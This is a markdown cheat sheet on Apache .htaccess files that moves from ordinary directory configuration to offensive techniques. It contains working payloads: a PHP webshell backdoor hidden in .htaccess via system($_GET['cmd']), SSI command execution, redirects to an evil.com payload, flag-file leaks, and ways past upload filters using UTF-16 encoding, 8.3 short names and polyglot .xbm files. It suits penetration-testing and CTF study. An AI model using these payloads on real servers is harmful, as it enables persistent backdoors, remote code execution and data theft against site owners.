
# Apache Configuration

`.htaccess` files are used to configure a web directory and its sub-directories.
_.htaccess files provide a way to make configuration changes on a per directory basis. `.htaccess` applies to the directory they are in and its sub-directories_

# .htaccess

What you can write in `.htaccess` is determined by the `AllowOverride` directive in the server's config.

> If `AllowOverride` is set to `All` in the main configuration, then malicious `.htaccess` will be interpreted as legit configuration files.

> `AllowOverride` can be set to `None` to stop `.htaccess` to be interpreted


> [!NOTE] Priority rules
> - `.htaccess` files can rewrite `<Directory/></Directory>` configurations
> - `.htaccess` files can't rewrite `<Location/></Location>` configurations


> [!Warning] Recursivity 
> Directives are applied to the directory and its sub-directories. When requesting any file, do not forget that upper `.htaccess` are interpreted as well

# Directives

- AccessFileName
- AllowOverride
- Options
- AddHandler
- SetHandler
- AuthType
- AuthName
- AuthUserFile
- AuthGroupFile
- Require

# Configuration

**Replace .htaccess files by custom filenames**

`Server config`
```bash
AccessFileName .thenewhtaccessname
```


**Options**

```bash
Options +ExecCGI
Options Includes
```

> [!Note] Options
> - `AllowOverride` should be at least set to `Options`
> - If `Options` is defined in an upper directory and defined again in a lower directory, the upper configuration is totally erased


**Basic authentication**

```bash
AuthType Basic
AuthName "Password Required"
AuthUserFile /www/passwords/password.file
AuthGroupFile /www/passwords/group.file
Require Group admins 
```

> [!Note] Authentication
> - `AllowOverride` should be at least set to `AuthConfig`


**Server Side Includes - SSI**

> SSI are directives that are placed in HTML pages, and evaluated on the server while the pages are being served. They let you add dynamically generated content to an existing HTML page, without having to serve the entire page via a CGI program, or other dynamic technology.

```bash
Options +Includes # permit files to be parsed for SSI directives

# 1. Tell Apache to parse any file with a particular file extension, such as .shtml
AddType text/html shtml   
AddHandler server-parsed shtml 

# 2. Tells Apache to parse files for SSI directives if they have the execute bit set
XBitHack on
```

*SSI Directives*
```html
<!--#element attribute=value attribute=value ... -->       # SSI syntax
<!--#echo var="DATE_LOCAL" -->                             # Today's date
<!--#config timefmt="%A %B %d, %Y" -->                     # Today's date
Today is <!--#echo var="DATE_LOCAL" -->                    # Today's date
<!--#include virtual="/footer.html" -->                    # An other page (footer for example)
<pre><!--#exec cmd="ls" --></pre>                          # RCE /bin/sh or DOS shell on Windows
```

> [!Note] SSI DIrectives
> - `AllowOverride` should be at least set to `Options` and `FileInfo`
> - You can autorize includes but forbid code execution with `Options` set as `IncludesNOEXEC`
> - https://httpd.apache.org/docs/2.2/fr/howto/ssi.html


**CGI**

> The CGI (Common Gateway Interface) defines a way for a web server to interact with external content-generating programs, which are often referred to as CGI programs or CGI scripts. It is the simplest, and most common, way to put dynamic content on your web site. This document will be an introduction to setting up CGI on your Apache web server, and getting started writing CGI programs.

```bash
Options +ExecCGI

# 1. Define CGI handling with file extensions
AddHandler cgi-script cgi pl

# 2. Handle all files in the folder
SetHandler cgi-script
```

*Configuration*
```bash
# Tells Apache to redirect http://exemple.com/cgi-bin/ scripts to /usr/.../cgi-bin/
ScriptAlias /cgi-bin/ /usr/local/apache2/cgi-bin/
```

*Writing CGI*
```perl
#!/usr/bin/perl
print "Content-type: text/html\n\n";
print "Hello, World.";
```

> [!NOTE] CGI
> - `AllowOverride` should be at least set to `Options` and `FileInfo`
> - All CGI output must be preceded by a MIME type
> - Outputs should be in a browser displayable format (e.g. HTML)
> - https://httpd.apache.org/docs/2.2/fr/howto/cgi.html


**Directory index**

> Change de page displayed when requesting `/`

```bash
DirectoryIndex home.html
```


**Redirect error messages**

> Handle the error response status code and message

```bash
ErrorDocument Error_Code_Number Message_Or_Destination

# Examples
ErrorDocument 403 http://evil.com/payload.php # Redirect users to a malicious website 
ErrorDocument 404 http://evil.com/payload.php
ErrorDocument 500 http://evil.com/payload.php

# Leaks absolute path to requested file when triggering errors
ErrorDocument 403 %{REQUEST_FILENAME}
ErrorDocument 404 %{REQUEST_FILENAME}

# Leak file content (requires absolute path)
ErrorDocument 404 %{file:/var/www/html/flag.txt}
ErrorDocument 403 %{file:/var/www/html/flag.txt}
```


**Authorize reading**

> Grant read access to many files

```.htaccess
<Files ".htaccess">
    Require all granted
</Files>
```


**Redirect requests**

```
Options +FollowSymLinks
RewriteEngine On
RewriteRule ^folder1.*$ https://mydomain.com/folder2/ [R=301,L]
```


**Redirect requests**
```
# Convert http://exemple.com/blabla/blabla to http://exemple.com/private/flag.txt/blabla/blabla
Redirect 301 / /private/flag.txt

# Convert http://exemple.com/blabla/blabla to http://google.com/private/flag.txt/blabla/blabla
Redirect 301 / http://google.com
```

**Modifying MIME type**

> You can use `.htaccess` to change the MIME type of some files to interpret them as code

```bash
# All files with an extension .custom will execute php
AddType application/x-httpd-php .custom 
AddType application/x-httpd-php5 .custom

# Interpret the .htaccess file as php
AddType application/x-httpd-php .htaccess

# If running php as cgi
AddHandler application/x-httpd-php .htaccess 
```

> [!Warning] Content-type
> Do not forget to update the content-type of the uploaded file in Burp
> ```
> Content-Type: application/x-httpd-php
> ```


**Append/Prepend file**

> Rather than having to call / include a file on every single page, you can have them automatically prepended (top of file) or appended (bottom of file) through your `.htaccess` configuration

```bash
php_value auto_prepend_file "/real/path/to/file/functions.php"
php_value auto_append_file "/real/path/to/file/footer.php"

# Base64 tricks
php_value auto_append_file "php://filter/convert.base64-encode/resource=/private/flag.txt"
```

# Unknown verb

> You can bypass **old** `.htaccess` configurations by using unknown verb

```bash
curl -X AAAA http://exemple.com/flag.txt
```

# Modules

You can test if a module is loading using the following condition
- If the .htaccess is readable, the module is present, otherwise module is not present
```bash
<IfModule mod_mime.c>
    <Files ~ "^\.ht">
        Require all granted
        Order allow,deny
        Allow from all
    </Files>
</IfModule>
```

**Modules :**
- `mod_info.c` perform information disclosure about Apache configuration
- `mod_status.c` perform RCE
- `mod_autoindex.c` list all files from a directory
- `mod_php.c` `mod_php5.c` `mod_php7.c` execute PHP scripts
- `mod_perl.c` execute Perl scripts
- `mod_rewrite.c` used to rewrite URLs
- `mod_mime.c` used to change the mime type of different file extension (e.g. interpret .html as php)
- `mod_include` used to interpret SSI (and potentially execute code)
- `mod_userdir.c` Allows user-specific directories to be accessible via URLs.
- `mod_alias.c` create directory and file aliases
- `mod_cgi` execute CGI scripts
- `mod_auth_basic.c` offers basic authentication
- `core.c` provides the essential infrastructure
- `mod_dir.c` choose the index file

# Common payloads


> [!Warning] PHP Engine
> When running malicious PHP scripts do not forget to enable php engine using `php_flag engine on`


`.htaccess` : Allow .htaccess reading
```xml
<Files ~ "^\.ht">  
	Require all granted  
	Order allow,deny  
	Allow from all  
</Files>
```

`.htaccess` : RCE by changing MIME type
```bash
php_flag engine on
AddType application/x-httpd-php .htaccess  
# <?php echo “get pwned”; ?>
```

`.htaccess` : RCE by changing MIME type
```bash
php_flag engine on
AddType application/x-httpd-php .htaccess  
# <?php phpinfo(); ?>
```

`.htaccess` : Change the content-type to read the source code
```xml
<!-- Note that this is not stealthy at all  -->
<FilesMatch “\.ph.*$”>  
	SetHandler text/plain  
	AddType text/plain .php  
</FilesMatch>
```

`.htaccess` : Disclose server status and server info
```bash
SetHandler server-status  
SetHandler server-info
```

`.htaccess` : List files by requesting `/`
```bash
Options +Indexes
```

`.htaccess` : Fully functional shell
```bash
# htaccess backdoor shell  
# this is relatively stealthy compared to a typical webshell

Options All +Indexes

# overriding deny rule  
# making htaccess accessible from the internet  
# without this you’ll get a HTTP 403  
<Files ~ "^\.ht">  
    Require all granted  
    Order allow,deny  
    Allow from all  
</Files>

php_flag engine on

# Make the server treat .htaccess file as .php file  
AddType application/x-httpd-php .htaccess
SetHandler application/x-httpd-php
AddHandler php5-script .htaccess

# <?php system($_GET['cmd']); ?>

# To execute commands you would navigate to:  
# http://vulnerable.com/.htaccess?cmd=YourCommand

# If system(); isnt working then try other syscalls  
# e.g. passthru(); shell_exec(); etc  
# If you still cant execute syscalls, try bypassing php.ini via htaccess
```


> [!Warning] PHP scripts
> PHP scripts has to be one liner. 
> It seems that multiple lines are not interpreted correctly

> [!Warning] Shell commands
> - Do not use `ls` in the first attempt, no files or no read permission will result in no response.
> - Instead use `whoami` or `id` that will always return data


# Common aliases

> Those files can be worth checking

```bash
htaccess           # without the dot
htaccess.txt       # Used in some CMS like Joomla
OLD.htaccess
1.htaccess
dot.htaccess
backup.htaccess
_.htaccess
-.htaccess
```

# Windows 8.3 (SFN)

> it may be possible to circumvent a blacklist-based filter that is stopping files named `htaccess` from being uploaded. 
> The shortname for .htaccess can be used in cases like this. An attacker could upload a file named **`HTACCE~1`** and if 8.3 filename conventions are in use, then this will be the equivalent to uploading a file named `.htaccess` 
> Assuming such filename conventions are in use (not too common these days), this could be used to bypass signature-based filters and blacklists that are in place for file upload functionality.


# Bypass filters

**PHP** supports several form of encoding. 
Default is UTF-8 but PHP understand UTF-16 as well.
- In UTF-8 chars are encoded on 1 byte
- In UTF-16 chars are encoded on 2 bytes
For example, it helps bypassing `<?php` filter

**UTF-8** payload
```php
00000000: 3c3f 7068 7020 7379 7374 656d 2824 5f47  <?php system($_G
00000010: 4554 5b27 636d 6427 5d29 3b20 6469 6528  ET['cmd']); die(
00000020: 293b 203f 3e0a                           ); ?>.
```
**UTF-16** payload (Big-endian to avoid some PHP bugs)
```php
00000000: 003c 003f 0070 0068 0070 0020 0073 0079  .<.?.p.h.p. .s.y
00000010: 0073 0074 0065 006d 0028 0024 005f 0047  .s.t.e.m.(.$._.G
00000020: 0045 0054 005b 0027 0063 006d 0064 0027  .E.T.[.'.c.m.d.'
00000030: 005d 0029 003b 0020 0064 0069 0065 0028  .].).;. .d.i.e.(
00000040: 0029 003b 0020 003f 003e 0a              .).;. .?.>.
```


> [!Warning] Configuration
> It requires the following Apache configuration
> ```
> php_value zend.multibyte 1       # Active specific encoding
> php_value zend.detect_unicode 1  # Detect if the file have unicode content
> php_value display_errors 1       # Display php errors
> ```

# Overwrite php.ini

`.htaccess`
```bash
php_value zend.multibyte 1       # Active specific encoding
php_value zend.detect_unicode 1  # Detect if the file have unicode content
php_value display_errors 1       # Display php errors


php_value upload_max_filesize 100M
php_value post_max_size 100M
php_value max_execution_time 200
php_value max_input_time 200
```

# Polyglot `.xbm`

> _“In computing, a polyglot is a computer program or script written in a valid form of multiple programming languages, which performs the same operations or output independent of the programming language used to compile or interpret it.”_

Ref : [http://php.net/manual/en/function.exif-imagetype.php](http://php.net/manual/en/function.exif-imagetype.php)

`.xbm` format is interesting because 
- it is interpreted as an image
- the first two lines define height and width ans start with `#`
- So, headers will not disturb our `.htaccess`

**`.htaccess` example as `.xbm**
```bash
#define test_width 16
#define test_height 7
static char test_bits[] = {
0x13, 0x00, 0x15, 0x00, 0x93, 0xcd, 0x55, 0xa5, 0x93, 0xc5, 0x00, 0x80, 0x00, 0x60 };
```




# Resources

- https://medium.com/@insecurity_92477/utilizing-htaccess-for-exploitation-purposes-part-1-5733dd7fc8eb
- http://corb3nik.github.io/blog/insomnihack-teaser-2019/l33t-hoster
- https://github.com/wireghoul/htshells/blob/master/traversal/mod_hitlog.traversal.htaccess
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20Apache%20.htaccess/
- https://httpd.apache.org/docs/2.2/fr/howto/htaccess.html
- https://swisskyrepo.github.io/PayloadsAllTheThings/Upload%20Insecure%20Files/Configuration%20Apache%20.htaccess/
- http://archive.justanotherhacker.com/2011/05/htaccess-based-attacks.html
- https://blog.qualys.com/vulnerabilities-threat-research/2015/10/22/unrestricted-file-upload-vulnerability
- https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp
- https://corz.org/server/tricks/htaccess.php
- [https://httpd.apache.org/docs/2.4/en/howto/htaccess.html](https://httpd.apache.org/docs/2.4/en/howto/htaccess.html)